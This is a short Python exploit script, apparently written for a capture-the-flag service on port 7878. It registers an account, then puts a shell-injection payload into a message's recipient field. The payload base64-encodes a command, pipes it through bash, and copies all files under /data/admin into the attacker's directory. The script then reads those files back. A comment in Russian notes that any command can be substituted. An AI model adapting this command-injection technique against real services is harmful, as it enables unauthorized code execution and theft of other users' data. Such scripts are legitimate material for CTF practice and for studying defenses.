#!/usr/bin/env python3
import requests
import sys
import base64
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

host = sys.argv[1]
username = "exploituser"
password = "exploituserpass"


requests.post(f"https://{host}:7878/register.m", data=f"{username}\x00{password}\x00", verify=False)

#					 А здесь любая команда, которую мы хотим исполнить
senduser = "';echo "+base64.b64encode(b"mkdir -p '/data/exploituser/checkflaguser' && cat /data/admin/*/* > /data/exploituser/checkflaguser/1").decode()+" |base64 -d|bash;echo '"
message  = "HELLO!"

dt = username+"\x00"+password+"\x00"+senduser+"\x00"+message+"\x00"

requests.post("https://localhost:7878/sendmsg.m", data=dt, verify=False)

dt = username+"\x00"+password+"\x00checkflaguser\x00"
r = requests.post("https://localhost:7878/getmsg.m", data=dt, verify=False)
print(r.text, flush=True)